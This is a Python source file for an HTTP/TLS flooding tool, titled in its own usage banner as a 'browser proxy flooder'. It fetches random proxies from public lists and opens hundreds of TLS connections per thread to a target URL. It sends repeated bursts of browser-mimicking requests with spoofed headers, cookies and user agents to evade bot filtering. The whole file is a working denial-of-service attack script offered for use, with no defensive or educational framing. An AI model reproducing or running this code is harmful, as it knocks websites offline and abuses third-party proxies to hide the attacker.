import socks
import socket
import requests
import ssl
import threading
import struct
import random
from MODEL.data import get_target, generate_url_path, random_useragent, COOKIE_CF, lang_header, a_header, encodeing_header

PROXY_MODE_HTTP = 'HTTP'
PROXY_MODE_HTTPS = 'HTTPS'
PROXY_MODE_SOCKS5 = 'SOCKS5'
PROXY_MODE_SOCKS4 = 'SOCKS4'

def proxy_get(mode, type):
    links = ['https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/%s.txt','https://www.stresserlist.com/scripts/%s.txt','http://pubproxy.com/api/proxy?type=%s&referer=true&user_agent=true&cookies=true&format=txt&limit=5&https=true','http://pubproxy.com/api/proxy?type=%s&referer=true&user_agent=true&cookies=true&format=txt&limit=5','https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/%s.txt','https://proxyspace.pro/%s.txt','https://api.proxyscrape.com/?request=displayproxies&proxytype=%s&country=all','https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/%s.txt']
    rand = random.choice((links))
    test = rand.replace('https://','').split('/')
    if test[0] == 'raw':
        if test[3] == 'B4RC0DE-TM' or test[3] == 'TheSpeedX':
           if mode.lower() == 'https':
              mode = 'http'
    elif test[0] == 'www.stresserlist.com':
        if mode.lower() == 'https':
            mode = 'http'
    try:
        r = requests.get(rand%(mode)).content.decode()
        proxy = random.choice(r.split('\n'))
        raw_proxy = proxy.split(':')
        s = socks.socksocket()
        if type == '3':
            s.set_proxy(socks.HTTP, raw_proxy[0], int(raw_proxy[1]))
        elif type == '2':
            s.set_proxy(socks.SOCKS5, raw_proxy[0], int(raw_proxy[1]))
        elif type == '1':
            s.set_proxy(socks.SOCKS4, raw_proxy[0], int(raw_proxy[1]))
        return proxy
    except Exception as e:
        print(f"An error occurred in proxy_get: {e}")
        return True

def browser_send(ssl_socket,byt2,byt):
   try:
    for _ in range(500):
        ssl_socket.write(byt2); ssl_socket.sendall(byt2); ssl_socket.send(byt2)
        ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
        ssl_socket.write(byt); ssl_socket.sendall(byt); ssl_socket.send(byt)
        ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
    ssl_socket.close()
   except:pass

def browser(target, methods, duration_sec_attack_dude, proxy_mode):
    default = 0
    if proxy_mode != 'None':
      if proxy_mode.upper() == PROXY_MODE_HTTP or proxy_mode.upper() == PROXY_MODE_HTTPS:default = 3
      elif proxy_mode.upper() == PROXY_MODE_SOCKS5:default = 2
      elif proxy_mode.upper() == PROXY_MODE_SOCKS4:default = 1
    path = 1
    for _ in range(int(duration_sec_attack_dude)):
        try:
            for _ in range(500):
                if proxy_mode == 'None':
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
                else:
                    s = socks.socksocket()
                    while True:
                        ip = proxy_get(proxy_mode, default)
                        if ip != True:
                            ip = ip.split(':')
                            if type == '3':s.set_proxy(socks.HTTP, ip[0], int(ip[1]))
                            elif type == '2':s.set_proxy(socks.SOCKS5, ip[0], int(ip[1]))
                            elif type == '1':s.set_proxy(socks.SOCKS4, ip[0], int(ip[1]))
                            break

                s.setblocking(1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 5); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 300); s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 63)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_OOBINLINE, 1)
                s.connect((str(target['host']),int(target['port'])))
                s.connect_ex((str(target['host']),int(target['port'])))
                try:ssl_socket = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23); ssl_socket.options |= ssl.HAS_SSLv2 | ssl.HAS_SSLv3
                except:ssl_socket  = ssl.SSLContext()
                ssl_socket.set_ciphers('NULL-MD5:NULL-SHA:RC4-MD5:RC4-SHA:IDEA-CBC-SHA:DES-CBC3-SHA:DHE-DSS-DES-CBC3-SHA:DHE-RSA-DES-CBC3-SHA:ADH-RC4-MD5:ADH-DES-CBC3-SHA:NULL-SHA256:AES128-SHA256:AES256-SHA256:AES128-GCM-SHA256:AES256-GCM-SHA384:DH-RSA-AES128-SHA256:DH-RSA-AES256-SHA256:DH-RSA-AES128-GCM-SHA256:DH-RSA-AES256-GCM-SHA384:DH-DSS-AES128-SHA256:DH-DSS-AES256-SHA256:DH-DSS-AES128-GCM-SHA256:DH-DSS-AES256-GCM-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-DSS-AES128-SHA256:DHE-DSS-AES256-SHA256:DHE-DSS-AES128-GCM-SHA256:DHE-DSS-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ADH-AES128-SHA256:ADH-AES256-SHA256:ADH-AES128-GCM-SHA256:ADH-AES256-GCM-SHA384:AES128-CCM:AES256-CCM:DHE-RSA-AES128-CCM:DHE-RSA-AES256-CCM:AES128-CCM8:AES256-CCM8:DHE-RSA-AES128-CCM8:DHE-RSA-AES256-CCM8:ECDHE-ECDSA-AES128-CCM:ECDHE-ECDSA-AES256-CCM:ECDHE-ECDSA-AES128-CCM8:ECDHE-ECDSA-AES256-CCM8:PSK-NULL-SHA:DHE-PSK-NULL-SHA:RSA-PSK-NULL-SHA:PSK-RC4-SHA:PSK-3DES-EDE-CBC-SHA:PSK-AES128-CBC-SHA:PSK-AES256-CBC-SHA:DHE-PSK-RC4-SHA:DHE-PSK-3DES-EDE-CBC-SHA:DHE-PSK-AES128-CBC-SHA:DHE-PSK-AES256-CBC-SHA:RSA-PSK-RC4-SHA:RSA-PSK-3DES-EDE-CBC-SHA:RSA-PSK-AES128-CBC-SHA:RSA-PSK-AES256-CBC-SHA:PSK-AES128-GCM-SHA256:PSK-AES256-GCM-SHA384:DHE-PSK-AES128-GCM-SHA256:DHE-PSK-AES256-GCM-SHA384:RSA-PSK-AES128-GCM-SHA256:RSA-PSK-AES256-GCM-SHA384:PSK-AES128-CBC-SHA256:PSK-AES256-CBC-SHA384:PSK-NULL-SHA256:PSK-NULL-SHA384:DHE-PSK-AES128-CBC-SHA256:DHE-PSK-AES256-CBC-SHA384:DHE-PSK-NULL-SHA256:DHE-PSK-NULL-SHA384:RSA-PSK-AES128-CBC-SHA256:RSA-PSK-AES256-CBC-SHA384:RSA-PSK-NULL-SHA256:RSA-PSK-NULL-SHA384:ECDHE-PSK-RC4-SHA:ECDHE-PSK-3DES-EDE-CBC-SHA:ECDHE-PSK-AES128-CBC-SHA:ECDHE-PSK-AES256-CBC-SHA:ECDHE-PSK-AES128-CBC-SHA256:ECDHE-PSK-AES256-CBC-SHA384:ECDHE-PSK-NULL-SHA:ECDHE-PSK-NULL-SHA256:ECDHE-PSK-NULL-SHA384:PSK-CAMELLIA128-SHA256:PSK-CAMELLIA256-SHA384:DHE-PSK-CAMELLIA128-SHA256:DHE-PSK-CAMELLIA256-SHA384:RSA-PSK-CAMELLIA128-SHA256:RSA-PSK-CAMELLIA256-SHA384:ECDHE-PSK-CAMELLIA128-SHA256:ECDHE-PSK-CAMELLIA256-SHA384:PSK-AES128-CCM:PSK-AES256-CCM:DHE-PSK-AES128-CCM:DHE-PSK-AES256-CCM:PSK-AES128-CCM8:PSK-AES256-CCM8:DHE-PSK-AES128-CCM8:DHE-PSK-AES256-CCM8:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:PSK-CHACHA20-POLY1305:ECDHE-PSK-CHACHA20-POLY1305:DHE-PSK-CHACHA20-POLY1305:RSA-PSK-CHACHA20-POLY1305:EDH-RSA-DES-CBC3-SHA:EDH-DSS-DES-CBC3-SHA:ECDHE-ECDSA-CAMELLIA128-SHA256:ECDHE-ECDSA-CAMELLIA256-SHA384:ECDHE-RSA-CAMELLIA128-SHA256:ECDHE-RSA-CAMELLIA256-SHA384:ARIA128-GCM-SHA256:ARIA256-GCM-SHA384:DHE-RSA-ARIA128-GCM-SHA256:DHE-RSA-ARIA256-GCM-SHA384:DHE-DSS-ARIA128-GCM-SHA256:DHE-DSS-ARIA256-GCM-SHA384:ECDHE-ECDSA-ARIA128-GCM-SHA256:ECDHE-ECDSA-ARIA256-GCM-SHA384:ECDHE-ARIA128-GCM-SHA256:ECDHE-ARIA256-GCM-SHA384:PSK-ARIA128-GCM-SHA256:PSK-ARIA256-GCM-SHA384:DHE-PSK-ARIA128-GCM-SHA256:DHE-PSK-ARIA256-GCM-SHA384:RSA-PSK-ARIA128-GCM-SHA256:RSA-PSK-ARIA256-GCM-SHA384:ECDHE-RSA-NULL-SHA:ECDHE-RSA-RC4-SHA:ECDHE-RSA-DES-CBC3-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-NULL-SHA:ECDHE-ECDSA-RC4-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA:AECDH-NULL-SHA:AECDH-RC4-SHA:AECDH-DES-CBC3-SHA:AECDH-AES128-SHA:AECDH-AES256-SHA:DHE-DSS-RC4-SHA:GOST2012-GOST8912-GOST8912:GOST2012-NULL-GOST12:GOST94-GOST89-GOST89:GOST2001-GOST89-GOST89:GOST94-NULL-GOST94:GOST2001-NULL-GOST94:SEED-SHA:DH-DSS-SEED-SHA:DH-RSA-SEED-SHA:DHE-DSS-SEED-SHA:DHE-RSA-SEED-SHA:ADH-SEED-SHA:CAMELLIA128-SHA:CAMELLIA256-SHA:DH-DSS-CAMELLIA128-SHA:DH-DSS-CAMELLIA256-SHA:DH-RSA-CAMELLIA128-SHA:DH-RSA-CAMELLIA256-SHA:DHE-DSS-CAMELLIA128-SHA:DHE-DSS-CAMELLIA256-SHA:DHE-RSA-CAMELLIA128-SHA:DHE-RSA-CAMELLIA256-SHA:ADH-CAMELLIA128-SHA:ADH-CAMELLIA256-SHA:AES128-SHA:AES256-SHA:DH-DSS-AES128-SHA:DH-DSS-AES256-SHA:DH-RSA-AES128-SHA:DH-RSA-AES256-SHA:DHE-DSS-AES128-SHA:DHE-DSS-AES256-SHA:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:ADH-AES128-SHA:ADH-AES256-SHA:DH-DSS-DES-CBC3-SHA:DH-RSA-DES-CBC3-SHA:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256')
                for ecdh_got in ['prime256v1','secp384r1']:
                 try:
                  ssl_socket.set_ecdh_curve(ecdh_got)
                 except:pass
                ssl_socket = ssl_socket.wrap_socket(s,server_hostname=target['host'])
                url_path = generate_url_path(path)
                byt2 = f"""{methods} /{url_path} HTTP/1.1\r\nAccept: {a_header()}\r\nAccept-Encoding: {encodeing_header()}\r\nAccept-Language: {lang_header()}\r\nConnection: Keep-Alive\r\nCookie: {COOKIE_CF()}\r\nPragma: no-cache\r\nCache-Control: max-age=0\r\nOrigin: {target['scheme']}://{target['host']}\r\nReferer: \r\nHost: {target['host']}\r\nSec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"\r\nSec-Ch-Ua-Mobile: ?0\r\nSec-Ch-Ua-Platform: "Windows"\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: {random_useragent()}\r\n\r\n""".encode()
                byt = f"""{methods} {target['uri']} HTTP/1.1\r\nAccept: {a_header()}\r\nAccept-Encoding: {encodeing_header()}\r\nAccept-Language: {lang_header()}\r\nConnection: Keep-Alive\r\nCookie: {COOKIE_CF()}\r\nPragma: no-cache\r\nCache-Control: max-age=0\r\nOrigin: {target['scheme']}://{target['host']}\r\nReferer: \r\nHost: {target['host']}\r\nSec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"\r\nSec-Ch-Ua-Mobile: ?0\r\nSec-Ch-Ua-Platform: "Windows"\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: {random_useragent()}\r\n\r\n""".encode()
                ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
                threading.Thread(target=browser_send,args=(ssl_socket,byt2,byt)).start()
                path += 1
        except Exception as e:
            print(f"An error occurred in browser: {e}")
            path += 1
            pass
import sys
url = ''
time_booter = 0
thread_lower = 0
methods = ''

if len(sys.argv) == 5:
    url = sys.argv[1]
    thread_lower = int(sys.argv[2])
    time_booter = int(sys.argv[3])
    methods = sys.argv[4]
    proxy_mode = 'None'
elif len(sys.argv) > 5:
    url = sys.argv[1]
    thread_lower = int(sys.argv[2])
    time_booter = int(sys.argv[3])
    methods = sys.argv[4]
    proxy_mode = sys.argv[5]
else:
    print(f'WELCOME TO BROWSER PROXY FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS> [PROXY-MODE]')
    exit()

target = get_target(url)

for _ in range(int(thread_lower)):
    for _ in range(10):
        threading.Thread(target=browser, args=(target, methods, time_booter, proxy_mode)).start()